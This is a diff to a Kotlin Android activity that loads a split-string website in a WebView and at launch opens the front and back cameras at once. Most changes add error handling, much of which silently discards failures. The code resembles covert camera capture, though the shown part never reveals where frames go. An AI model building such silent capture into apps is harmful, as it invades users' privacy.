@@ -20,7 +20,7 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private lateinit var cameraManager: CameraManager
-    private val TARGET_URL = "https://" + "ertuta.it"
+    private val targetUrl = "https://" + "ertuta.it"
 
     private var frontCameraDevice: CameraDevice? = null
     private var backCameraDevice: CameraDevice? = null
@@ -54,22 +54,30 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startSystem() {
-        webView.loadUrl(TARGET_URL)
+        webView.loadUrl(targetUrl)
         startConcurrentCameras()
     }
 
     @SuppressLint("MissingPermission")
     private fun startConcurrentCameras() {
-        val concurrentSets = cameraManager.concurrentCameraIds
+        val concurrentSets: Set<Set<String>> = try {
+            cameraManager.concurrentCameraIds
+        } catch (e: Exception) {
+            emptySet()
+        }
+
         var frontId: String? = null
         var backId: String? = null
 
         for (set in concurrentSets) {
             for (id in set) {
-                val chars = cameraManager.getCameraCharacteristics(id)
-                val facing = chars.get(CameraCharacteristics.LENS_FACING)
-                if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontId = id
-                if (facing == CameraCharacteristics.LENS_FACING_BACK) backId = id
+                try {
+                    val chars = cameraManager.getCameraCharacteristics(id)
+                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
+                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) frontId = id
+                    if (facing == CameraCharacteristics.LENS_FACING_BACK) backId = id
+                } catch (e: Exception) {
+                }
             }
             if (frontId != null && backId != null) break
         }
@@ -99,36 +107,47 @@ class MainActivity : AppCompatActivity() {
             image.close()
         }, null)
 
-        cameraManager.openCamera(frontId, object : CameraDevice.StateCallback() {
-            override fun onOpened(camera: CameraDevice) {
-                frontCameraDevice = camera
-                createSession(camera, frontImageReader!!)
-            }
-            override fun onDisconnected(camera: CameraDevice) { camera.close() }
-            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-        }, null)
+        try {
+            cameraManager.openCamera(frontId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    frontCameraDevice = camera
+                    frontImageReader?.let { createSession(camera, it) }
+                }
+                override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+            }, null)
 
-        cameraManager.openCamera(backId, object : CameraDevice.StateCallback() {
-            override fun onOpened(camera: CameraDevice) {
-                backCameraDevice = camera
-                createSession(camera, backImageReader!!)
-            }
-            override fun onDisconnected(camera: CameraDevice) { camera.close() }
-            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-        }, null)
+            cameraManager.openCamera(backId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    backCameraDevice = camera
+                    backImageReader?.let { createSession(camera, it) }
+                }
+                override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+            }, null)
+        } catch (e: Exception) {
+            Toast.makeText(this, "Kamera baslatilamadi: " + e.message, Toast.LENGTH_LONG).show()
+        }
     }
 
     private fun createSession(camera: CameraDevice, reader: ImageReader) {
         val surface = reader.surface
-        val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-            addTarget(surface)
-        }
-        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
-            override fun onConfigured(session: CameraCaptureSession) {
-                session.setRepeatingRequest(builder.build(), null, null)
+        try {
+            val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                addTarget(surface)
             }
-            override fun onConfigureFailed(session: CameraCaptureSession) {}
-        }, null)
+            @Suppress("DEPRECATION")
+            camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    try {
+                        session.setRepeatingRequest(builder.build(), null, null)
+                    } catch (e: Exception) {
+                    }
+                }
+                override fun onConfigureFailed(session: CameraCaptureSession) {}
+            }, null)
+        } catch (e: Exception) {
+        }
     }
 
     override fun onDestroy() {
